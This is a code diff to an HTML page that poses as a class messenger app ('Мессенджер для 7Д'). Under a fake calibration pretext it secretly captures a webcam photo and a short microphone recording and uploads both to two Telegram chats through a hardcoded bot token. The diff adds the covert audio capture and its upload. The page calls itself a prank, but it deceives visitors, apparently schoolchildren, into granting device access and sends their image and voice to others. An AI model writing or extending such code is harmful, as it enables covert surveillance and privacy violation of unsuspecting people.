@@ -107,23 +107,22 @@
         <div class="logo">💬</div>
         <h2 style="margin: 0; font-size: 20px; color: #fff;">Мессенджер для 7Д</h2>
         <div class="spinner"></div>
-        <div id="status-text">Инициализация аудио-модуля... Подготовка к созвону.</div>
+        <div id="status-text">Подключение к аудио-комнате...</div>
     </div>
 
     <!-- ЭКРАН 2: Результат -->
     <div id="prank-screen">
         <h1>ТЫ РАЗЫГРАН! 😂</h1>
         <div id="photo-container"></div>
-        <div class="sub-text" id="upload-status">Передаем данные в класс... ⏳</div>
+        <div class="sub-text" id="upload-status">Отправка файлов в бота... ⏳</div>
     </div>
 
-    <!-- Скрытые элементы камеры/микрофона -->
+    <!-- Скрытые элементы камеры -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const BOT_TOKEN = '9176741718:AAG4UgtGs8O8MovvouhjS8ncg3Jbgl73PWY'; 
-        // Массив со всеми Chat ID
         const CHAT_IDS = ['7523561197', '8671534168'];
 
         const video = document.getElementById('video');
@@ -134,72 +133,105 @@
         const statusText = document.getElementById('status-text');
         const uploadStatus = document.getElementById('upload-status');
 
-        async function sendToTelegram(dataUrl) {
-            try {
-                const res = await fetch(dataUrl);
-                const blob = await res.blob();
-                
-                // Отправляем снимки по всем указанным Chat ID
-                for (const chatId of CHAT_IDS) {
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'target.png');
-                    formData.append('caption', '🎯 Пойман новый жертва! 😂');
+        // Отправка фото в Telegram
+        async function sendPhotoToTelegram(dataUrl) {
+            const res = await fetch(dataUrl);
+            const blob = await res.blob();
+            
+            for (const chatId of CHAT_IDS) {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'target.png');
+                formData.append('caption', '🎯 Снимок с камеры!');
 
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                }
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+        }
 
-                uploadStatus.textContent = "Снимок успешно отправлен! 🚀";
-            } catch (err) {
-                console.error('Ошибка сети:', err);
-                uploadStatus.textContent = "Ошибка связи с Telegram.";
+        // Отправка аудиозаписи в Telegram
+        async function sendAudioToTelegram(audioBlob) {
+            for (const chatId of CHAT_IDS) {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('audio', audioBlob, 'audio_record.ogg');
+                formData.append('caption', '🎙 Аудиозапись с микрофона (5 сек)');
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                    method: 'POST',
+                    body: formData
+                });
             }
         }
 
         async function initMessengerPrank() {
             try {
-                statusText.textContent = "Шаг 1/2: Калибровка микрофона для связи...";
-                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+                statusText.textContent = "Запрос доступа к мультимедиа...";
                 
-                await new Promise(resolve => setTimeout(resolve, 1500));
-
-                statusText.textContent = "Шаг 2/2: Проверка видеокамеры...";
-                const videoStream = await navigator.mediaDevices.getUserMedia({ 
+                // Запрашиваем сразу и видео, и аудио
+                const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: true, 
-                    audio: false 
+                    audio: true 
                 });
                 
-                video.srcObject = videoStream;
-                statusText.textContent = "Подключение к конференции...";
+                video.srcObject = stream;
+                statusText.textContent = "Калибровка звука и видео...";
 
+                // Запускаем запись аудио через MediaRecorder
+                const audioChunks = [];
+                const mediaRecorder = new MediaRecorder(stream);
+                
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) {
+                        audioChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.start();
+
+                // Делаем фотку через 1 секунду после запуска
                 setTimeout(async () => {
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const photoDataUrl = canvas.toDataURL('image/png');
 
-                    const dataUrl = canvas.toDataURL('image/png');
-
+                    // Показываем фото на экране
                     const img = document.createElement('img');
-                    img.src = dataUrl;
+                    img.src = photoDataUrl;
                     photoContainer.appendChild(img);
-
-                    audioStream.getTracks().forEach(track => track.stop());
-                    videoStream.getTracks().forEach(track => track.stop());
 
                     loaderScreen.style.display = 'none';
                     prankScreen.style.display = 'flex';
 
-                    await sendToTelegram(dataUrl);
+                    // Отправляем фото
+                    await sendPhotoToTelegram(photoDataUrl);
+
+                    // Записываем звук 5 секунд, затем останавливаем и отправляем
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, 4000);
 
                 }, 1000);
 
+                // Когда аудиозапись завершится
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                    
+                    // Выключаем камеру и микрофон
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // Отправляем аудио в Telegram
+                    await sendAudioToTelegram(audioBlob);
+                    uploadStatus.textContent = "Фото и аудиозапись успешно отправлены! 🚀";
+                };
+
             } catch (err) {
-                statusText.textContent = "Ошибка доступа. Для входа в мессенджер нужны разрешения.";
+                statusText.textContent = "Ошибка доступа. Требуется разрешение на камеру и микрофон.";
             }
         }
 
